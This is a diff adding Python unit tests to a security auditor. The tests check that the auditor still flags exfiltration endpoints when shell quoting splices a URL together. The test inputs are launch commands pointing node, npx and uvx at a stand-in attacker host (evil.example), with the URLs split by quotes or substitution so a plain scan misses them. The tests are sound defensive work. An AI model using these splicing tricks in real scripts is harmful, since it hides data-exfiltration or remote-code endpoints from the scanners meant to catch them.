@@ -425,5 +425,153 @@ class TestReviewerRepro(unittest.TestCase):
         self.assertEqual((res["grade"], res["findings"]), ("A", []))
 
 
+class TestAUrlThatAShellPutsTogether(unittest.TestCase):
+    """`bash -c "node x.js https://''evil.example/c"` runs node with
+    `https://evil.example/c`: the shell takes the quotes out. The scan for
+    endpoints reads the text of a script as written, and a quote ends a URL
+    there, so the URL was not seen at all (found while fixing the same gap in
+    a `git+` spec). The words the shell hands over are scanned as well."""
+
+    WHERE = ("critical", "exfiltration-endpoint")
+    CHECKS = ("exfiltration-endpoint", "unparseable-url", "git-source",
+              "package-registry", "remote-server")
+
+    @staticmethod
+    def script(text, shell="bash"):
+        if shell == "cmd":
+            return {"command": "cmd", "args": ["/c", text]}
+        return {"command": shell, "args": ["-c", text]}
+
+    def found(self, cfg):
+        return [f for f in detectors.audit_server("s", cfg, [], ())
+                if f["check"] in self.CHECKS]
+
+    SPLICES = (
+        ("empty quotes in front of the host", "node x.js https://''evil.example/c"),
+        ("empty double quotes", 'node x.js https://""evil.example/c'),
+        ("quotes in the scheme", "node x.js ht''tps://evil.example/c"),
+        ("a quoted scheme", 'node x.js "https://"evil.example/c'),
+        ("a quoted host", "node x.js https://'evil'.example/c"),
+        ("in a pipeline", "echo hi | node x.js https://''evil.example/c"),
+        ("after another command", "cd /tmp && node x.js https://''evil.example/c"),
+        ("in a command substitution", "node x.js $(echo https://''evil.example/c)"),
+    )
+
+    def test_a_spliced_url_is_the_endpoint_it_is(self):
+        want = self.found(self.script("node x.js https://evil.example/c"))
+        self.assertEqual([(f["severity"], f["check"]) for f in want],
+                         [self.WHERE])
+        for label, text in self.SPLICES:
+            for shell in ("bash", "sh", "zsh"):
+                with self.subTest(label, shell=shell):
+                    self.assertEqual(self.found(self.script(text, shell)),
+                                     want)
+
+    # The text as written is a URL of its own here (with another host); the
+    # shell makes the one on the right of the comment out of it.
+    SPLICES_THAT_ARE_A_URL_AS_WRITTEN = (
+        ("a quote in the middle of the host", "node x.js https://evil'.'example/c"),
+        ("a backslash before a letter", "node x.js https://e\\vil.example/c"),
+    )
+
+    def test_a_spliced_url_is_found_next_to_the_one_the_text_spells(self):
+        want = self.found(self.script("node x.js https://evil.example/c"))
+        for label, text in self.SPLICES_THAT_ARE_A_URL_AS_WRITTEN:
+            for shell in ("bash", "sh", "zsh"):
+                with self.subTest(label, shell=shell):
+                    found = self.found(self.script(text, shell))
+                    for f in want:
+                        self.assertIn(f, found)
+                    for f in found:
+                        self.assertIn((f["severity"], f["check"]),
+                                      (self.WHERE,
+                                       ("high", "unparseable-url")), found)
+
+    def test_the_same_in_cmd(self):
+        want = self.found(self.script("node x.js https://evil.example/c",
+                                      "cmd"))
+        self.assertEqual([(f["severity"], f["check"]) for f in want],
+                         [self.WHERE])
+        for text in ('node x.js https://""evil.example/c',
+                     'node x.js ht""tps://evil.example/c'):
+            with self.subTest(text):
+                self.assertEqual(self.found(self.script(text, "cmd")), want)
+
+    def test_a_spliced_package_source_is_an_endpoint_too(self):
+        for text in ("npx -y git+https://''evil.example/o/r",
+                     "uvx --from 'git+https://'\"evil.example\"/o/r tool"):
+            with self.subTest(text):
+                found = self.found(self.script(text))
+                self.assertEqual([(f["severity"], f["check"])
+                                  for f in found], [self.WHERE], found)
+
+    def test_nothing_is_reported_twice(self):
+        for text in ("node x.js https://evil.example/c",
+                     "node x.js 'https://evil.example/c'",
+                     "echo hi && node x.js https://evil.example/c"):
+            with self.subTest(text):
+                self.assertEqual(len(self.found(self.script(text))), 1)
+        # two URLs of one host are two findings now, and two findings after
+        text = ("node x.js https://evil.example/a https://evil.example/b")
+        self.assertEqual(len(self.found(self.script(text))), 2)
+
+    def test_what_is_quiet_stays_quiet(self):
+        for text in ("node x.js 'http://localhost:3000/a'",
+                     "node x.js http://''localhost:3000/a",
+                     "node x.js https://''api.github.com/x",
+                     "uvx --from 'git+https://github.com/o/r@%s' tool"
+                     % ("0123456789abcdef0123456789abcdef01234567",),
+                     "npx --registry 'https://registry.npmjs.org/' -y p@1.0.0"):
+            with self.subTest(text):
+                found = self.found(self.script(text))
+                self.assertFalse([f for f in found
+                                  if f["severity"] in ("critical", "high")],
+                                 found)
+
+    def test_a_source_in_a_script_is_still_judged_by_its_pin(self):
+        found = self.found(self.script(
+            "uvx --from 'git+https://github.com/o/r' tool"))
+        self.assertEqual([(f["severity"], f["check"]) for f in found],
+                         [("medium", "git-source")])
+
+    def test_the_arguments_of_the_entry_are_not_a_script(self):
+        # a program that is handed `ht''tps://evil.example` has quotes in its
+        # argument, no shell takes them out
+        cfg = {"command": "node", "args": ["x.js", "ht''tps://evil.example/c"]}
+        self.assertEqual(self.found(cfg), [])
+
+    def audit(self, text):
+        return [(f["severity"], f["check"]) for f in detectors.audit_server(
+            "s", self.script(text), [], ())]
+
+    def test_a_script_of_many_urls_is_read_in_bounded_time(self):
+        import time
+        script = "node x.js " + " ".join(
+            "https://''evil%d.example/c" % i for i in range(20000))
+        start = time.monotonic()
+        found = self.audit(script)
+        self.assertLess(time.monotonic() - start, 10)
+        self.assertIn(("critical", "exfiltration-endpoint"), found)
+
+    def test_more_urls_than_are_read_make_the_entry_unaudited(self):
+        # a script is read word by word up to a limit; padding it with quiet
+        # URLs must not push a bad one out of sight - past the limit it is
+        # reported as one that could not be read (and --deep leaves it alone)
+        limit = detectors._MAX_SCRIPT_URLS
+        pad = ["http://''localhost:3000/p%d" % i for i in range(limit)]
+        found = self.audit("node x.js " + " ".join(
+            pad + ["https://''evil.example/c"]))
+        self.assertIn(("high", "detector-error"), found)
+        # up to the limit it is read to the end
+        found = self.audit("node x.js " + " ".join(
+            pad[:limit - 1] + ["https://''evil.example/c"]))
+        self.assertNotIn(("high", "detector-error"), found)
+        self.assertIn(("critical", "exfiltration-endpoint"), found)
+        # the same word any number of times is one word
+        found = self.audit("node x.js " + " ".join(
+            ["https://''evil.example/c"] * (limit + 50)))
+        self.assertNotIn(("high", "detector-error"), found)
+
+
 if __name__ == "__main__":
     unittest.main()
